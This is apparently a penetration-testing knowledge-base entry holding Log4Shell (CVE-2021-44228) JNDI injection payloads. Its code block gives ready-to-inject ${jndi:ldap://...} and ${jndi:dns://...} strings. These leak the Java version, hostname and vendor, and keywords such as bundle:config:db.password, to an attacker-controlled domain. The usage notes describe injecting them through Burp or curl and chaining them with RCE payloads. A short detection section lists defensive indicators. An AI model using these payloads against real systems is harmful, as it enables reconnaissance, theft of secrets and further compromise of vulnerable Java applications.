---
type: code
language: injection
verified: true
platforms:
  - Java
  - Web
tags:
  - log4shell
  - payload
  - jndi
validated: true
---

# Log4Shell-JNDI-Enumeration-Payloads

## Code

```injection
# Identify Java version and hostname
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# More enumerations keywords and variables
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```

## Description

This code snippet contains JNDI lookup payloads and property keywords for enumerating information via Log4Shell (CVE-2021-44228). The first section provides ready-to-inject strings for Java version and hostname extraction, while the second lists additional properties to customize payloads. These are injected into vulnerable Log4j-processed inputs to force remote resolutions that leak data.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_DOMAIN | Domain controlled by attacker for capturing DNS/LDAP queries | attacker.com |

## Usage

Copy individual lines into tools like Burp Repeater or curl for injection into app inputs (e.g., POST username=${payload}). Monitor attacker server for resolved queries. Use in reconnaissance phases of web app pentests targeting Log4j apps; chain with RCE payloads for full exploitation.

## Detection

- WAF logs showing ${jndi: patterns in inputs.
- Anomalous outbound LDAP/DNS from app servers to external domains.
- Log4j audit logs with JNDI lookups (enable via configuration).
- SIEM alerts on property resolutions in network traffic.

## Related

- [[procedures/Enumerate-Information-via-Log4Shell-JNDI-Lookups]]
